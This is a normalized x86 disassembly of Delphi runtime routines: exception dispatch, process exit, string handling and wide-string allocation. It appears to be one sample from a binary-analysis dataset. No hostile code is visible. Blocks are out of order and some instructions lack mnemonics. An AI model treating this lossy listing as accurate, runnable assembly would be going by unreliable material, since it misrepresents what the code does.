movsx eax al
inc ecx
inc ecx
jmp r-xdata
add ecx eax
sub_4036f4
cmp [ rw-data ] 0x1
jbe r-xdata
retn
push eax
push edx
push ecx
call sub_4036d4
push ecx
push esp
push 0x1
push 0x0
push 0xeedfae1
call [ rw-data ]
pop ecx
pop ecx
pop edx
pop eax
sub_403758
mov eax [ esp + 0x4 ]
test [ eax + 0x4 ] 0x6
jne r-xdata
mov eax 0x1
retn
cmp [ eax ] 0xeedfade
mov edx [ eax + 0x18 ]
mov ecx [ eax + 0x14 ]
je r-xdata
cmp [ rw-data ] 0x1
jbe r-xdata
cld
call sub_4031c4
mov edx [ rw-data ]
test edx edx
je r-xdata
or [ eax + 0x4 ] 0x2
push ebx
xor ebx ebx
push esi
push edi
push ebp
mov ebx [ fs : ebx ]
push ebx
push eax
push edx
push ecx
mov edx [ esp + 0x28 ]
push 0x0
push eax
push r-xdata
push edx
call [ rw-data ]
mov edi [ esp + 0x28 ]
call sub_405fa4
push [ eax ]
mov [ eax ] esp
mov ebp [ edi + 0x8 ]
mov ebx [ edi + 0x4 ]
mov [ edi + 0x4 ] r-xdata
add ebx 0x5
call sub_4036c0
jmp ebx
cmp [ rw-data ] 0x0
ja r-xdata
call edx
test eax eax
je r-xdata
push eax
lea eax [ esp + 0x8 ]
push edx
push ecx
push eax
call UnhandledExceptionFilter
cmp eax 0x0
pop ecx
pop edx
pop eax
je r-xdata
mov edx [ esp + 0xc ]
mov ecx [ esp + 0x4 ]
cmp [ ecx ] 0xeefface
je r-xdata
mov edx eax
mov eax [ esp + 0x4 ]
mov ecx [ eax + 0xc ]
call sub_403670
cmp [ rw-data ] 0x0
jbe r-xdata
cmp [ rw-data ] 0x0
ja r-xdata
lea ecx [ esp + 0x4 ]
push eax
push ecx
call UnhandledExceptionFilter
cmp eax 0x0
pop eax
je r-xdata
mov edx eax
mov eax [ esp + 0x4 ]
mov ecx [ eax + 0xc ]
jmp r-xdata
sub_403884
mov eax [ esp + 0x4 ]
test [ eax + 0x4 ] 0x6
jne r-xdata
mov eax 0x1
retn
cmp [ eax ] 0xeedfade
je r-xdata
mov eax [ eax + 0x18 ]
mov eax [ eax ]
cld
call sub_4031c4
mov edx [ rw-data ]
test edx edx
je r-xdata
mov eax [ esp + 0x14 ]
cmp [ eax ] 0xeedfade
mov edx [ eax + 0x18 ]
mov ecx [ eax + 0x14 ]
je r-xdata
mov edi ebp
jmp r-xdata
call edx
test eax eax
jne r-xdata
cmp [ rw-data ] 0x1
jbe r-xdata
call [ rw-data ]
mov edx [ esp + 0x1c ]
call sub_403670
cmp [ rw-data ] 0x0
jbe r-xdata
mov eax [ eax ]
cmp eax edi
je r-xdata
mov edx [ esp + 0x8 ]
push ebx
push esi
push edi
push ebp
mov ecx [ edx + 0x4 ]
mov ebx [ ecx + 0x5 ]
lea esi [ ecx + 0x9 ]
mov ebp eax
jmp r-xdata
xor ebx ebx
mov ebx [ fs : ebx ]
push ebx
push eax
push edx
push ecx
mov edx [ esp + 0x28 ]
or [ eax + 0x4 ] 0x2
push esi
push 0x0
push eax
push r-xdata
push edx
call [ rw-data ]
pop ebx
mov edi [ esp + 0x28 ]
call sub_405fa4
push [ eax ]
mov [ eax ] esp
mov ebp [ edi + 0x8 ]
mov [ edi + 0x4 ] r-xdata
mov eax [ esp + 0x8 ]
call sub_4036ac
jmp [ ebx + 0x4 ]
cmp [ rw-data ] 0x0
ja r-xdata
mov edx eax
mov eax [ esp + 0x14 ]
mov ecx [ eax + 0xc ]
jmp r-xdata
cmp [ rw-data ] 0x0
ja r-xdata
mov ecx [ eax - 0x28 ]
cmp ecx [ edi - 0x28 ]
jne r-xdata
push eax
lea eax [ esp + 0x8 ]
push edx
push ecx
push eax
call UnhandledExceptionFilter
cmp eax 0x0
pop ecx
pop edx
pop eax
je r-xdata
lea ecx [ esp + 0x4 ]
push eax
push ecx
call UnhandledExceptionFilter
cmp eax 0x0
pop eax
je r-xdata
mov edi [ edi - 0x24 ]
mov eax [ esi ]
test edi edi
jne r-xdata
mov eax [ eax - 0x2c ]
mov edx [ edi - 0x2c ]
xor ecx ecx
mov cl [ eax ]
cmp cl [ edx ]
jne r-xdata
mov edi [ edi ]
add esi 0x8
dec ebx
jne r-xdata
inc eax
inc edx
call sub_402c34
je r-xdata
mov eax [ esi ]
test eax eax
je r-xdata
pop ebp
pop edi
pop esi
pop ebx
jmp r-xdata
sub_403a0c
mov eax [ esp + 0x4 ]
mov edx [ esp + 0x8 ]
test [ eax + 0x4 ] 0x6
je r-xdata
mov eax 0x1
retn
mov ecx [ edx + 0x4 ]
mov [ edx + 0x4 ] r-xdata
push ebx
push esi
push edi
push ebp
mov ebp [ edx + 0x8 ]
add ecx 0x5
call sub_4036f4
call ecx
pop ebp
pop edi
pop esi
pop ebx
sub_403a44
or eax eax
jne r-xdata
pop edx
push esp
push ebp
push edi
push esi
push ebx
push eax
push edx
push esp
push 0x7
push 0x1
push 0xeedfade
push edx
jmp [ rw-data ]
mov eax 0xd8
call sub_403ffc
sub_403a6c
mov eax [ esp + 0x30 ]
mov [ eax + 0x4 ] r-xdata
call sub_405fa4
mov edx [ eax ]
mov ecx [ edx ]
mov [ eax ] ecx
mov eax [ edx + 0xc ]
and [ eax + 0x4 ] 0xfffffffd
cmp [ eax ] 0xeedfade
je r-xdata
xor eax eax
add esp 0x14
mov edx [ fs : eax ]
pop ecx
mov edx [ edx ]
mov [ ecx ] edx
pop ebp
pop edi
pop esi
pop ebx
mov eax 0x1
retn
mov eax [ edx + 0x8 ]
call sub_403290
call sub_403654
sub_403ac0
call sub_405fa4
mov edx [ eax ]
mov ecx [ edx ]
mov [ eax ] ecx
mov eax [ edx + 0x8 ]
call sub_403290
pop edx
mov esp [ esp + 0x2c ]
xor eax eax
pop ecx
mov [ fs : eax ] ecx
pop eax
pop ebp
call sub_40371c
jmp edx
sub_403b08
push ebp
mov ebp esp
mov edx [ ebp + 0x8 ]
mov eax [ edx ]
cmp eax 0xc0000092
jg r-xdata
cmp eax 0xc0000096
jg r-xdata
je r-xdata
sub eax 0xc00000fd
je r-xdata
je r-xdata
mov al 0xcf
jmp r-xdata
cmp eax 0xc000008e
jg r-xdata
mov al 0xca
jmp r-xdata
sub eax 0x3d
je r-xdata
mov al 0xda
jmp r-xdata
sub eax 0xc0000093
je r-xdata
and eax 0xff
mov edx [ edx + 0xc ]
call sub_4027d0
add eax 0x3fffff71
sub eax 0x2
jb r-xdata
je r-xdata
mov al 0xd9
jmp r-xdata
jmp r-xdata
mov al 0xce
jmp r-xdata
dec eax
je r-xdata
je r-xdata
mov al 0xc8
jmp r-xdata
sub eax 0xc0000005
je r-xdata
mov al 0xff
mov al 0xc8
jmp r-xdata
dec eax
je r-xdata
mov al 0xcd
jmp r-xdata
jmp r-xdata
mov al 0xd8
jmp r-xdata
sub eax 0x87
je r-xdata
mov al 0xd7
jmp r-xdata
jmp r-xdata
mov al 0xc9
jmp r-xdata
dec eax
je r-xdata
jmp r-xdata
sub_403c68
xor edx edx
mov eax [ rw-data ]
test eax eax
je r-xdata
retn
mov ecx [ fs : edx ]
cmp eax ecx
jne r-xdata
cmp ecx 0xffffffff
je r-xdata
mov eax [ eax ]
mov [ fs : edx ] eax
retn
cmp [ ecx ] eax
jne r-xdata
mov ecx [ ecx ]
mov eax [ eax ]
mov [ ecx ] eax
sub_403c90
push ebp
mov ebp esp
push ebx
push esi
push edi
mov edi rw-data
mov eax [ edi + 0x8 ]
test eax eax
je r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn
mov ebx [ edi + 0xc ]
mov esi [ eax + 0x4 ]
xor edx edx
push ebp
push sub_403cd6
push [ fs : edx ]
mov [ fs : edx ] esp
test ebx ebx
jle r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
dec ebx
mov [ edi + 0xc ] ebx
mov eax [ esi + ebx * 8 + 0x4 ]
test eax eax
je r-xdata
test ebx ebx
jg r-xdata
call eax
sub_403cf0
push ebp
mov ebp esp
push ebx
push esi
push edi
mov eax [ rw-data ]
test eax eax
je r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn
mov esi [ eax ]
xor ebx ebx
mov edi [ eax + 0x4 ]
xor edx edx
push ebp
push sub_403d36
push [ fs : edx ]
mov [ fs : edx ] esp
cmp esi ebx
jle r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
mov eax [ edi + ebx * 8 ]
inc ebx
mov [ rw-data ] ebx
test eax eax
je r-xdata
cmp esi ebx
jg r-xdata
call eax
sub_403d90
push ebx
xor ebx ebx
push edi
push esi
mov edi [ eax + ebx ]
lea esi [ eax + ebx + 0x4 ]
mov eax [ esi + 0x4 ]
mov edx [ esi ]
add eax ebx
add edx ebx
call sub_405d38
add esi 0x8
dec edi
jne r-xdata
pop esi
pop edi
pop ebx
retn
sub_403db4
push ebx
xor ebx ebx
push edi
push esi
mov edi [ eax + ebx ]
lea esi [ eax + ebx + 0x4 ]
mov eax [ esi + 0x4 ]
mov edx [ esi ]
mov eax [ eax + ebx ]
add edx ebx
call sub_405d38
add esi 0x8
dec edi
jne r-xdata
pop esi
pop edi
pop ebx
retn
sub_403ddc
push ebx
xor ebx ebx
push edi
push esi
mov edi [ eax + ebx ]
lea esi [ eax + ebx + 0x4 ]
mov eax [ esi + 0x4 ]
mov edx [ esi ]
mov eax [ eax + ebx ]
add eax [ esi + 0x8 ]
mov [ edx + ebx ] eax
add esi 0xc
dec edi
jne r-xdata
pop esi
pop edi
pop ebx
retn
sub_403e00
push ebx
push esi
push edi
mov esi rw-data
mov cl 0x10
mov ebx [ rw-data ]
mov eax ebx
mov edi 0xa
cdq
idiv edi
add dl 0x30
xor eax eax
mov al cl
mov [ esi + eax ] dl
mov eax ebx
mov ebx 0xa
cdq
idiv ebx
mov ebx eax
dec ecx
test ebx ebx
jne r-xdata
mov cl 0x1c
mov eax [ rw-data ]
mov edx eax
and edx 0xf
mov dl [ edx + rw-data ]
xor ebx ebx
mov bl cl
mov [ esi + ebx ] dl
shr eax 0x4
dec ecx
test eax eax
jne r-xdata
pop edi
pop esi
pop ebx
retn
sub_403e5c
xor eax eax
xchg [ rw-data ] eax
neg eax
sbb eax eax
inc eax
mov edi rw-data
mov ebx [ edi + 0x18 ]
mov ebp [ edi + 0x14 ]
push [ edi + 0x1c ]
push [ edi + 0x20 ]
mov esi [ edi ]
mov ecx 0xb
[ edi ] [ esi ]
pop edi
pop esi
leave
retn 0xc
sub_403e8c
push ecx
cmp [ rw-data ] 0x0
je r-xdata
cmp [ rw-data ] 0x0
jne r-xdata
cmp [ rw-data ] 0xd7b2
jne r-xdata
pop edx
retn
push 0x0
push rw-data
push rw-data
push 0x0
call sub_40123c
push 0x0
lea eax [ esp + 0x4 ]
push eax
push 0x1e
push rw-data
push 0xfffffff5
call sub_401204
push eax
call sub_401224
push 0x0
lea eax [ esp + 0x4 ]
push eax
push 0x2
push r-xdata
push 0xfffffff5
call sub_401204
push eax
call sub_401224
pop edx
retn
cmp [ rw-data ] 0x0
jbe r-xdata
mov eax rw-data
call [ rw-data ]
sub_403f18
push ebx
push esi
push edi
push ebp
mov ebx rw-data
mov esi rw-data
mov edi rw-data
cmp [ ebx + 0x28 ] 0x0
jne r-xdata
cmp [ rw-data ] 0x0
je r-xdata
cmp [ edi ] 0x0
je r-xdata
cmp [ ebx + 0x28 ] 0x2
jne r-xdata
call sub_403e00
call sub_403e8c
xor eax eax
mov [ rw-data ] eax
mov edx [ edi ]
mov eax edx
xor edx edx
mov [ edi ] edx
mov ebp eax
call ebp
cmp [ edi ] 0x0
jne r-xdata
call sub_403c90
cmp [ ebx + 0x28 ] 0x1
jbe r-xdata
cmp [ esi ] 0x0
jne r-xdata
mov eax [ ebx + 0x10 ]
test eax eax
je r-xdata
cmp [ esi ] 0x0
je r-xdata
xor eax eax
mov [ ebx + 0xc ] eax
call sub_403c68
cmp [ ebx + 0x28 ] 0x1
jne r-xdata
call sub_405804
mov edx [ ebx + 0x10 ]
mov eax [ edx + 0x10 ]
cmp eax [ edx + 0x4 ]
je r-xdata
cmp [ ebx + 0x28 ] 0x0
je r-xdata
call [ ebx + 0x24 ]
test eax eax
je r-xdata
cmp [ ebx ] 0x0
jne r-xdata
call sub_403e5c
push eax
call sub_401254
mov eax [ ebx ]
push esi
mov esi eax
mov edi ebx
mov ecx 0xb
[ edi ] [ esi ]
pop esi
jmp r-xdata
cmp [ rw-data ] 0x0
je r-xdata
mov eax [ esi ]
push eax
call ExitProcess
call [ rw-data ]
sub_404008
mov edx [ eax ]
test edx edx
je r-xdata
retn
mov [ eax ] 0x0
mov ecx [ edx - 0x8 ]
dec ecx
jl r-xdata
[ edx - 0x8 ]
jne r-xdata
push eax
lea eax [ edx - 0x8 ]
call sub_4026ec
pop eax
sub_40402c
push ebx
push esi
mov ebx eax
mov esi edx
add ebx 0x4
dec esi
jne r-xdata
mov [ ebx ] 0x0
mov ecx [ edx - 0x8 ]
dec ecx
jl r-xdata
mov edx [ ebx ]
test edx edx
je r-xdata
pop esi
pop ebx
retn
[ edx - 0x8 ]
jne r-xdata
lea eax [ edx - 0x8 ]
call sub_4026ec
sub_40405c
test edx edx
je r-xdata
xchg [ eax ] edx
test edx edx
je r-xdata
mov ecx [ edx - 0x8 ]
inc ecx
jg r-xdata
retn
mov ecx [ edx - 0x8 ]
dec ecx
jl r-xdata
[ edx - 0x8 ]
push eax
push edx
mov eax [ edx - 0x4 ]
call sub_4040cc
mov edx eax
pop eax
push edx
mov ecx [ eax - 0x4 ]
call sub_4028c8
pop edx
pop eax
jmp r-xdata
[ edx - 0x8 ]
jne r-xdata
lea eax [ edx - 0x8 ]
call sub_4026ec
sub_4040a0
test edx edx
je r-xdata
xchg [ eax ] edx
test edx edx
je r-xdata
mov ecx [ edx - 0x8 ]
inc ecx
jle r-xdata
retn
mov ecx [ edx - 0x8 ]
dec ecx
jl r-xdata
[ edx - 0x8 ]
[ edx - 0x8 ]
jne r-xdata
lea eax [ edx - 0x8 ]
call sub_4026ec
sub_4040cc
test eax eax
jle r-xdata
xor eax eax
retn
push eax
add eax 0xa
and eax 0xfffffffe
push eax
call sub_4026cc
pop edx
mov [ edx + eax - 0x2 ] 0x0
add eax 0x8
pop edx
mov [ eax - 0x4 ] edx
mov [ eax - 0x8 ] 0x1
retn
sub_4040f8
push ebx
push esi
push edi
mov ebx eax
mov esi edx
mov edi ecx
mov eax edi
call sub_4040cc
mov ecx edi
mov edi eax
test esi esi
je r-xdata
mov eax ebx
call sub_404008
mov [ ebx ] edi
pop edi
pop esi
pop ebx
retn
mov edx eax
mov eax esi
call sub_4028c8
sub_404128
push ebp
mov ebp esp
push 0x0
push 0x0
push edx
push eax
mov eax [ ebp + 0x8 ]
push eax
push ecx
push 0x0
mov eax [ rw-data ]
push eax
call WideCharToMultiByte
pop ebp
retn 0x4
sub_404148
push ebp
mov ebp esp
push edx
push eax
mov eax [ ebp + 0x8 ]
push eax
push ecx
push 0x0
mov eax [ rw-data ]
push eax
call MultiByteToWideChar
pop ebp
retn 0x4
sub_404164
push ebx
push esi
push edi
push ebp
add esp 0xfffff004
push eax
add esp 0xfffffffc
mov esi ecx
mov [ esp ] edx
mov edi eax
test esi esi
jg r-xdata
lea ebp [ esi + 0x1 ]
cmp ebp 0x7ff
jge r-xdata
mov eax edi
call sub_404008
jmp r-xdata
mov ebx ebp
add ebx ebx
mov eax edi
mov edx ebx
call sub_404654
push esi
mov eax [ edi ]
mov ecx [ esp + 0x4 ]
mov edx ebx
call sub_404128
mov ebx eax
test ebx ebx
jge r-xdata
push esi
lea eax [ esp + 0x8 ]
mov ecx [ esp + 0x4 ]
mov edx 0xfff
call sub_404128
mov ebx eax
test ebx ebx
jl r-xdata
add esp 0x1004
pop ebp
pop edi
pop esi
pop ebx
retn
mov eax edi
mov edx ebx
call sub_404654
xor ebx ebx
lea edx [ esp + 0x4 ]
mov eax edi
mov ecx ebx
call sub_4040f8
jmp r-xdata
sub_404200
xor ecx ecx
test edx edx
je r-xdata
jmp sub_4040f8
push edx
mov ecx edx
pop edx
sub ecx edx
cmp cl [ edx + 0x1 ]
je r-xdata
inc edx
cmp cl [ edx + 0x2 ]
je r-xdata
inc edx
cmp cl [ edx + 0x3 ]
je r-xdata
inc edx
add edx 0x4
jmp r-xdata
cmp cl [ edx ]
je r-xdata
sub_404230
xor ecx ecx
test edx edx
je r-xdata
jmp sub_404164
push edx
mov ecx edx
pop edx
sub ecx edx
shr ecx 0x1
cmp cx [ edx + 0x2 ]
je r-xdata
add edx 0x2
cmp cx [ edx + 0x4 ]
je r-xdata
add edx 0x2
cmp cx [ edx + 0x6 ]
je r-xdata
add edx 0x2
add edx 0x8
jmp r-xdata
cmp cx [ edx ]
je r-xdata
sub_404278
push edi
push eax
push ecx
mov edi edx
xor eax eax
[ edi ]
jne r-xdata
pop eax
add ecx eax
pop eax
pop edi
jmp sub_4040f8
not ecx
sub_4042a4
push ebx
test edx edx
je r-xdata
mov [ eax ] 0x0
pop ebx
retn
mov ebx [ edx - 0x4 ]
test ebx ebx
je r-xdata
cmp ecx ebx
jl r-xdata
mov [ eax ] cl
inc eax
xchg edx eax
call sub_4028c8
pop ebx
retn
mov ecx ebx
sub_4042d0
test edx edx
je r-xdata
retn
mov ecx [ eax ]
test ecx ecx
je sub_40405c
push ebx
push esi
push edi
mov ebx eax
mov esi edx
mov edi [ ecx - 0x4 ]
mov edx [ esi - 0x4 ]
add edx edi
cmp esi ecx
je r-xdata
call sub_404654
mov eax [ ebx ]
mov ecx edi
jmp r-xdata
call sub_404654
mov eax esi
mov ecx [ esi - 0x4 ]
mov edx [ ebx ]
add edx edi
call sub_4028c8
pop edi
pop esi
pop ebx
retn
sub_404314
test edx edx
je r-xdata
mov edx ecx
jmp sub_40405c
test ecx ecx
je sub_40405c
cmp edx [ eax ]
je r-xdata
mov edx ecx
jmp sub_4042d0
cmp ecx [ eax ]
je r-xdata
push ebx
push esi
push edi
mov ebx edx
mov esi ecx
push eax
mov eax [ ebx - 0x4 ]
add eax [ esi - 0x4 ]
call sub_4040cc
mov edi eax
mov edx eax
mov eax ebx
mov ecx [ ebx - 0x4 ]
call sub_4028c8
mov edx edi
mov eax esi
mov ecx [ esi - 0x4 ]
add edx [ ebx - 0x4 ]
call sub_4028c8
pop eax
mov edx edi
test edi edi
je r-xdata
push eax
push ecx
call sub_40405c
pop edx
pop eax
jmp sub_4042d0
call sub_40405c
pop edi
pop esi
pop ebx
retn
dec [ edi - 0x8 ]
sub_404388
push ebx
push esi
push edi
push edx
push eax
mov ebx edx
xor edi edi
mov ecx [ esp + edx * 4 + 0x14 ]
test ecx ecx
je r-xdata
xor eax eax
cmp [ eax ] ecx
jne r-xdata
dec edx
jne r-xdata
add eax [ ecx - 0x4 ]
cmp edi ecx
jne r-xdata
mov edi ecx
mov eax [ ecx - 0x4 ]
dec edx
jmp r-xdata
mov ecx [ esp + edx * 4 + 0x14 ]
test ecx ecx
je r-xdata
test edi edi
je r-xdata
xor edi edi
call sub_4040cc
push eax
mov esi eax
mov edx eax
mov eax [ esp ]
mov esi [ edi - 0x4 ]
call sub_404654
mov edi [ esp ]
push [ edi ]
add esi [ edi ]
dec ebx
jmp r-xdata
dec ebx
jne r-xdata
mov ecx [ eax - 0x4 ]
add esi ecx
call sub_4028c8
mov eax [ esp + ebx * 4 + 0x18 ]
mov edx esi
test eax eax
je r-xdata
pop edx
pop eax
test edi edi
jne r-xdata
pop edx
pop edi
pop esi
pop ebx
pop eax
lea esp [ esp + edx * 4 ]
jmp eax
test edx edx
je r-xdata
call sub_40405c
dec [ edx - 0x8 ]
sub_404414
push ebx
push esi
push edi
mov esi eax
mov edi edx
cmp eax edx
je r-xdata
pop edi
pop esi
pop ebx
retn
test esi esi
je r-xdata
mov edx [ edi - 0x4 ]
sub eax edx
jmp r-xdata
test edi edi
je r-xdata
mov eax [ esi - 0x4 ]
sub eax edx
jmp r-xdata
mov eax [ esi - 0x4 ]
mov edx [ edi - 0x4 ]
sub eax edx
ja r-xdata
push edx
shr edx 0x2
je r-xdata
add edx eax
pop edx
and edx 0x3
je r-xdata
mov ecx [ esi ]
mov ebx [ edi ]
cmp ecx ebx
jne r-xdata
add eax eax
jmp r-xdata
mov ecx [ esi ]
mov ebx [ edi ]
cmp cl bl
jne r-xdata
pop edx
cmp cl bl
jne r-xdata
dec edx
je r-xdata
dec edx
je r-xdata
cmp ch bh
jne r-xdata
add esi 0x4
add edi 0x4
mov ecx [ esi + 0x4 ]
mov ebx [ edi + 0x4 ]
cmp ecx ebx
jne r-xdata
cmp ch bh
jne r-xdata
shr ecx 0x10
shr ebx 0x10
cmp cl bl
jne r-xdata
add esi 0x8
add edi 0x8
dec edx
jne r-xdata
dec edx
je r-xdata
cmp ch bh
jmp r-xdata
and ebx 0xff0000
and ecx 0xff0000
cmp ecx ebx
jne r-xdata
sub_4044d4
mov edx [ eax ]
test edx edx
je r-xdata
mov eax edx
retn
mov ecx [ edx - 0x8 ]
dec ecx
je r-xdata
push ebx
mov ebx eax
mov eax [ edx - 0x4 ]
call sub_4040cc
mov edx eax
mov eax [ ebx ]
mov [ ebx ] edx
push eax
mov ecx [ eax - 0x4 ]
call sub_4028c8
pop eax
mov ecx [ eax - 0x8 ]
dec ecx
jl r-xdata
mov edx [ ebx ]
pop ebx
[ eax - 0x8 ]
jne r-xdata
lea eax [ eax - 0x8 ]
call sub_4026ec
sub_404528
push ebx
test eax eax
je r-xdata
mov eax [ esp + 0x8 ]
call sub_404008
mov ebx [ eax - 0x4 ]
test ebx ebx
je r-xdata
dec edx
jl r-xdata
xor edx edx
jmp r-xdata
cmp edx ebx
jge r-xdata
sub ebx edx
test ecx ecx
jl r-xdata
cmp ecx ebx
jg r-xdata
mov ecx ebx
jmp r-xdata
add edx eax
mov eax [ esp + 0x8 ]
call sub_4040f8
jmp r-xdata
pop ebx
retn 0x4
sub_404568
push ebx
push esi
push edi
mov ebx eax
mov esi edx
mov edi ecx
call j_sub_4044d4#2
mov edx [ ebx ]
test edx edx
je r-xdata
pop edi
pop esi
pop ebx
retn
mov ecx [ edx - 0x4 ]
dec esi
jl r-xdata
cmp esi ecx
jge r-xdata
test edi edi
jle r-xdata
sub ecx esi
cmp edi ecx
jle r-xdata
sub ecx edi
add edx esi
lea eax [ edi + edx ]
call sub_4028c8
mov edx [ ebx ]
mov eax ebx
mov edx [ edx - 0x4 ]
sub edx edi
call sub_404654
mov edi ecx
sub_4045b0
test eax eax
je r-xdata
retn
push ebx
push esi
push edi
push ebp
mov ebx eax
mov esi edx
mov edi ecx
mov edx [ edx ]
push edx
test edx edx
je r-xdata
dec edi
jge r-xdata
mov edx [ edx - 0x4 ]
cmp edi edx
jle r-xdata
xor edi edi
mov ebp [ ebx - 0x4 ]
mov eax esi
add edx ebp
call sub_404654
pop eax
cmp eax ebx
jne r-xdata
mov edi edx
mov eax [ esi ]
lea edx [ edi + ebp ]
mov ecx [ eax - 0x4 ]
sub ecx edx
add edx eax
add eax edi
call sub_4028c8
mov eax ebx
mov edx [ esi ]
mov ecx ebp
add edx edi
call sub_4028c8
pop ebp
pop edi
pop esi
pop ebx
mov ebx [ esi ]
sub_40460c
test eax eax
je r-xdata
retn
test edx edx
je r-xdata
xor eax eax
retn
push ebx
push esi
push edi
mov esi eax
mov edi edx
mov ecx [ edi - 0x4 ]
push edi
mov edx [ esi - 0x4 ]
dec edx
js r-xdata
pop edx
xor eax eax
jmp r-xdata
mov al [ esi ]
inc esi
sub ecx edx
jle r-xdata
pop edi
pop esi
pop ebx
[ edi ]
jne r-xdata
mov ebx ecx
push esi
push edi
mov ecx edx
[ esi ] [ edi ]
pop edi
pop esi
je r-xdata
pop edx
mov eax edi
sub eax edx
mov ecx ebx
jmp r-xdata
sub_404654
push ebx
push esi
push edi
mov ebx eax
mov esi edx
xor edi edi
test edx edx
jle r-xdata
mov eax ebx
call sub_404008
mov [ ebx ] edi
mov eax [ ebx ]
test eax eax
je r-xdata
mov eax edx
call sub_4040cc
mov edi eax
mov eax [ ebx ]
test eax eax
je r-xdata
cmp [ eax - 0x8 ] 0x1
jne r-xdata
mov edx edi
mov ecx [ eax - 0x4 ]
cmp ecx esi
jl r-xdata
sub eax 0x8
add edx 0x9
push eax
mov eax esp
call sub_40270c
pop eax
add eax 0x8
mov [ ebx ] eax
mov [ eax - 0x4 ] esi
mov [ esi + eax ] 0x0
jmp r-xdata
call sub_4028c8
mov ecx esi
pop edi
pop esi
pop ebx
retn
sub_404700
push ebx
push esi
mov ebx eax
mov esi edx
add ebx 0x4
dec esi
jne r-xdata
mov [ ebx ] 0x0
push eax
call SysFreeString
mov eax [ ebx ]
test eax eax
je r-xdata
pop esi
pop ebx
retn
sub_404724
test edx edx
je sub_4046e8
mov ecx [ edx - 0x4 ]
shr ecx 0x1
je sub_4046e8
push ecx
push edx
push eax
call SysReAllocStringLen
test eax eax
je r-xdata
mov al 0x1
jmp sub_402828
retn
sub_404748
push ebx
push esi
push edi
push ebp
add esp 0xfffff004
push eax
add esp 0xfffffffc
mov esi ecx
mov [ esp ] edx
mov edi eax
test esi esi
jg r-xdata
lea ebp [ esi + 0x1 ]
cmp ebp 0x7ff
jge r-xdata
mov eax edi
call sub_4046e8
jmp r-xdata
mov ebx ebp
mov eax edi
mov edx ebx
call sub_404930
push esi
mov eax [ edi ]
mov ecx [ esp + 0x4 ]
mov edx ebx
call sub_404148
mov ebx eax
test ebx ebx
jge r-xdata
push esi
lea eax [ esp + 0x8 ]
mov ecx [ esp + 0x4 ]
mov edx 0x7ff
call sub_404148
mov ebx eax
test ebx ebx
jle r-xdata
add esp 0x1004
pop ebp
pop edi
pop esi
pop ebx
retn
mov eax edi
mov edx ebx
call sub_404930
xor ebx ebx
lea edx [ esp + 0x4 ]
mov eax edi
mov ecx ebx
call sub_4047d4
jmp r-xdata
sub_4047d4
test ecx ecx
je sub_4046e8
push eax
push ecx
push edx
call SysAllocStringLen
test eax eax
je r-xdata
mov al 0x1
jmp sub_402828
pop edx
push [ edx ]
mov [ edx ] eax
call SysFreeString
retn
sub_4047f8
xor ecx ecx
test edx edx
je r-xdata
jmp sub_4047d4
push edx
mov ecx edx
pop edx
sub ecx edx
shr ecx 0x1
cmp cx [ edx + 0x2 ]
je r-xdata
add edx 0x2
cmp cx [ edx + 0x4 ]
je r-xdata
add edx 0x2
cmp cx [ edx + 0x6 ]
je r-xdata
add edx 0x2
add edx 0x8
jmp r-xdata
cmp cx [ edx ]
je r-xdata
sub_404860
push ebx
push esi
push edi
mov esi eax
mov edi edx
cmp eax edx
je r-xdata
pop edi
pop esi
pop ebx
retn
test esi esi
je r-xdata
mov edx [ edi - 0x4 ]
sub eax edx
jmp r-xdata
test edi edi
je r-xdata
mov eax [ esi - 0x4 ]
sub eax edx
jmp r-xdata
mov eax [ esi - 0x4 ]
mov edx [ edi - 0x4 ]
sub eax edx
ja r-xdata
push edx
shr edx 0x2
je r-xdata
add edx eax
pop edx
and edx 0x2
je r-xdata
mov ecx [ esi ]
mov ebx [ edi ]
cmp ecx ebx
jne r-xdata
add eax eax
jmp r-xdata
mov cx [ esi ]
mov bx [ edi ]
cmp cx bx
jne r-xdata
pop edx
cmp cx bx
jne r-xdata
dec edx
je r-xdata
shr ecx 0x10
shr ebx 0x10
cmp cx bx
add esi 0x4
add edi 0x4
mov ecx [ esi + 0x4 ]
mov ebx [ edi + 0x4 ]
cmp ecx ebx
jne r-xdata
add esi 0x8
add edi 0x8
dec edx
jne r-xdata
jmp r-xdata
sub_4048e4
push ebp
mov ebp esp
push ebx
push esi
push edi
mov edi ecx
mov ebx edx
mov esi eax
mov eax esi
call sub_404854
cmp ebx 0x1
jge r-xdata
dec ebx
cmp eax ebx
jge r-xdata
xor ebx ebx
jmp r-xdata
test edi edi
jge r-xdata
mov ebx eax
sub eax ebx
cmp edi eax
jge r-xdata
xor eax eax
jmp r-xdata
mov edx ebx
add edx edx
add edx esi
mov ecx [ ebp + 0x8 ]
xchg ecx eax
call sub_4047d4
pop edi
pop esi
pop ebx
pop ebp
retn 0x4
mov eax edi
sub_404930
push ebx
push esi
push edi
mov esi edx
mov edi eax
xor ebx ebx
test esi esi
jle r-xdata
mov eax edi
mov edx ebx
call sub_4046d8
pop edi
pop esi
pop ebx
retn
mov eax esi
call sub_4046c0
mov ebx eax
mov eax [ edi ]
call sub_404854
test eax eax
jle r-xdata
cmp esi eax
jge r-xdata
mov ecx eax
add ecx ecx
mov edx ebx
mov eax [ edi ]
call sub_4028c8
mov eax esi
sub_404974
xor ecx ecx
push ebx
mov cl [ edx + 0x1 ]
push esi
push edi
mov ebx eax
lea esi [ ecx + edx + 0xa ]
mov edi [ ecx + edx + 0x6 ]
mov edx [ esi ]
mov eax [ esi + 0x4 ]
add eax ebx
mov edx [ edx ]
mov ecx 0x1
call sub_4049a4
add esi 0x8
dec edi
jg r-xdata
pop edi
pop esi
pop ebx
retn
sub_4049a4
test ecx ecx
je r-xdata
retn
push ebx
push esi
push edi
mov ebx eax
mov esi edx
mov edi ecx
xor edx edx
mov al [ esi ]
mov dl [ esi + 0x1 ]
xor ecx ecx
cmp al 0xa
je r-xdata
mov [ ebx ] ecx
add ebx 0x4
dec edi
jg r-xdata
cmp al 0xb
je r-xdata
jmp r-xdata
cmp al 0xc
je r-xdata
pop edi
pop esi
pop ebx
mov [ ebx ] ecx
mov [ ebx + 0x4 ] ecx
mov [ ebx + 0x8 ] ecx
mov [ ebx + 0xc ] ecx
add ebx 0x10
dec edi
jg r-xdata
cmp al 0xd
je r-xdata
jmp r-xdata
push ebp
mov ebp edx
cmp al 0xe
je r-xdata
